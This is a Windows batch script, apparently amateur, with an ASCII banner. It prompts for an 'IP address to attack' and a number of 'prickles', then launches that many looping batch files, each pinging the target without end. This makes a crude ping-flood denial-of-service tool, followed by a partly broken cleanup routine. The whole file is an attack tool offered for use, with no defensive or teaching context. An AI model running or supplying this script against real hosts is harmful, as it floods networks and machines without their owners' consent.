@echo off 
color a1

Echo   ___            _                    _     _  _                         
Echo  / __l __ _  __ l l_  _  _  ___      l l__ l ll l       _ __   __ _ __ __
Echo l (__ / _` l/ _ll  _ll ll l(_-/      l  _ \ \_. l      l '  \ / _` l\ \ /
Echo  \___l\__/_l\__l \__l \_._l/__/      l____/ l__/       l_l_l_l\__/_l/_\_\
pause
Echo =
Echo =
Echo =
Echo =
























SET /p ip=IP address to attack:
SET /p inst=number of prickles you want to run(higher the better)(40= average):
set num=1



::if exist temp%num%.vbs goto num

:s
echo @echo off > "temp%num%.bat"
echo title temp%num% >> "temp%num%.bat"
echo :s >> "temp%num%.bat"
echo ping %ip% >> "temp%num%.bat"
echo goto s >> "temp%num%.bat"
start temp%num%.bat



If %num% EQU %inst% goto end

SET /A num = %num% + 1
goto s

















::del temp%num%.vbs
::goto input

:end
Echo all instances running 
echo press anything to delete all instanes 
pause
set /a num = 1
SET /a inst = %inst% + 1
:don


del temp%num%.bat

taskkill /IM temp%num%.bat
SET /A num = %num% + 1
If %num% EQU %inst% exit
goto don